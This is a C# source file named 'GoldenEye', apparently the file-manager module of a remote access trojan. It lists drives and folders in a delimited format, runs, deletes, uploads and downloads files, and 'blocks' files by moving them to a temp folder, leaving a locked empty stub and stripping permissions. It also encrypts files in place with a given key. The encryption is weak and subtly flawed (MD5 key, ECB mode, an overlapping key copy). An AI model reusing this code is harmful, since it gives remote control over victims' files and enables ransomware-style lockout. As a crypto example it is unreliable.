using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;

namespace GoldenEye
{
    internal class FileManager
    {
        public string getDrives()
        {
            string allDrives = "";
            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    double freeSpace = drive.TotalFreeSpace;
                    double totalSpace = drive.TotalSize;
                    double percentFree = (freeSpace / totalSpace) * 100;
                    float num = (float)percentFree;
                    string displayed_value = percentFree.ToString("N0");
                    allDrives += drive.Name + "²" + drive.DriveType + " (" + drive.DriveFormat + ")" + "²" + displayed_value + "% Space Free" + "²" + "Unknown" + "³";
                }
            }
            catch
            {
            }

            return allDrives.Replace("Fixed", "Drive");
        }

        public string getDirectoryData(string loc)
        {
            try
            {
                string allFiles = "";

                // Seeking the files in the directory
                System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(loc);
                foreach (System.IO.DirectoryInfo dirr in dir.GetDirectories())
                {
                    allFiles += dirr.Name + "²" + "Folder" + "²" + "---" + "²" + dirr.CreationTime + "³";
                }

                FileInfo[] rgFiles = dir.GetFiles("*.*");
                foreach (FileInfo file in rgFiles)
                {
                    allFiles += file.Name + "²" + "File" + "²" + (file.Length / 1000).ToString() + " KB" + "²" + file.CreationTime + "³";
                }

                return allFiles;
            }
            catch (Exception neax)
            {
                Console.WriteLine(neax);
                return "Error";
            }
        }

        public void runFile(string loc)
        {
            try
            {
                Process.Start(loc);
            }
            catch (Exception eax)
            {
                Console.WriteLine("Couldnt start Process! Error:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }

        public void delFile(string loc)
        {
            try
            {
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(false, false);
                FolderInfo.SetAccessControl(FolderAcl);

                File.Delete(loc);
            }
            catch (Exception eax)
            {
                Console.WriteLine("Couldnt delete File! Error:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }

        public void delDir(string loc)
        {
            try
            {
                Directory.Delete(loc, true);
            }
            catch (Exception eax)
            {
                Console.WriteLine("Couldnt delete Directory(Folder)! Error:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }

        public void blockfile(string loc)
        {
            try
            {
                Random r = new Random();
                string temp = Path.GetTempPath();
                File.Move(loc, temp + r.Next(500, 5000));
                File.WriteAllText(loc, string.Empty);
                FileSystem.FileOpen(FileSystem.FreeFile(), loc, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite);
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(true, false);
                FolderInfo.SetAccessControl(FolderAcl);
            }
            catch (Exception eax)
            {
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(true, false);
                FolderInfo.SetAccessControl(FolderAcl);

                Console.WriteLine("Couldnt block File! Error:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }

        public void blockDir(string loc)
        {
            try
            {
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(true, true);
                FolderInfo.SetAccessControl(FolderAcl);
            }
            catch (Exception eax)
            {
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(true, true);
                FolderInfo.SetAccessControl(FolderAcl);

                Console.WriteLine("Couldnt block Folder! Error:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }

        public void unblockFile(string loc)
        {
            try
            {
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(false, false);
                FolderInfo.SetAccessControl(FolderAcl);
                FileStream stream = new FileStream(loc, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None);
                stream.Close();
            }
            catch (Exception eax)
            {
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(false, false);
                FolderInfo.SetAccessControl(FolderAcl);

                Console.WriteLine("Couldnt unblock File! Error:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }

        public void unblockDir(string loc)
        {
            try
            {
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(false, true);
                FolderInfo.SetAccessControl(FolderAcl);
            }
            catch (Exception eax)
            {
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(loc);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(false, true);
                FolderInfo.SetAccessControl(FolderAcl);

                Console.WriteLine("Couldnt unblock Folder! Error:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }

        public void encryptFile(string path, string key)
        {
            string filestring = Convert.ToBase64String(File.ReadAllBytes(path));
            string fileEncrypted = AES_Encrypt(filestring, key);
            File.WriteAllText(path, fileEncrypted);
        }
        public void decryptFile(string path, string key)
        {
            string fileDecrypted = AES_Decrypt(File.ReadAllText(path), key);
            File.WriteAllBytes(path, Convert.FromBase64String(fileDecrypted));

        }
        public string AES_Encrypt(string input, string pass)
        {
            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
            System.Security.Cryptography.MD5CryptoServiceProvider Hash_AES = new System.Security.Cryptography.MD5CryptoServiceProvider();
            string encrypted = "";
            try
            {
                byte[] hash = new byte[32];
                byte[] temp = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass));
                Array.Copy(temp, 0, hash, 0, 16);
                Array.Copy(temp, 0, hash, 15, 16);
                AES.Key = hash;
                AES.Mode = System.Security.Cryptography.CipherMode.ECB;
                System.Security.Cryptography.ICryptoTransform DESEncrypter = AES.CreateEncryptor();
                byte[] Buffer = System.Text.ASCIIEncoding.ASCII.GetBytes(input);
                encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length));
                return encrypted;
            }
            catch (Exception ex)
            {
                return "ERROR";
            }
        }
        public string AES_Decrypt(string input, string pass)
        {
            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
            System.Security.Cryptography.MD5CryptoServiceProvider Hash_AES = new System.Security.Cryptography.MD5CryptoServiceProvider();
            string decrypted = "";
            try
            {
                byte[] hash = new byte[32];
                byte[] temp = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass));
                Array.Copy(temp, 0, hash, 0, 16);
                Array.Copy(temp, 0, hash, 15, 16);
                AES.Key = hash;
                AES.Mode = System.Security.Cryptography.CipherMode.ECB;
                System.Security.Cryptography.ICryptoTransform DESDecrypter = AES.CreateDecryptor();
                byte[] Buffer = Convert.FromBase64String(input);
                decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length));
                return decrypted;
            }
            catch (Exception ex)
            {
                return "ERROR";
            }
        }
        public void createDir(string loc)
        {
            try
            {
                Directory.CreateDirectory(loc);
            }
            catch (Exception eax)
            {
                Console.WriteLine("Couldnt create Directory!");
                Console.WriteLine();
                Console.WriteLine("Error:");
                Console.WriteLine(eax.ToString());
            }
        }

        public string dlFile(string loc)
        {
            try
            {
                string returnThis = Convert.ToBase64String(File.ReadAllBytes(loc));
                return returnThis;
            }
            catch (Exception eax)
            {
                Console.WriteLine("Couldnt download File (Covert to Base64)!");
                Console.WriteLine();
                Console.WriteLine("Error:");
                Console.WriteLine(eax.ToString());
                return "ERROR";
            }
        }

        public void uplfile(string loc, string filestring)
        {
            try
            {
                File.WriteAllBytes(loc, Convert.FromBase64String(filestring));
            }
            catch (Exception eax)
            {
                Console.WriteLine("Couldnt upload(create) File!");
                Console.WriteLine();
                Console.WriteLine("Error:");
                Console.WriteLine(eax.ToString());
            }
        }
    }
}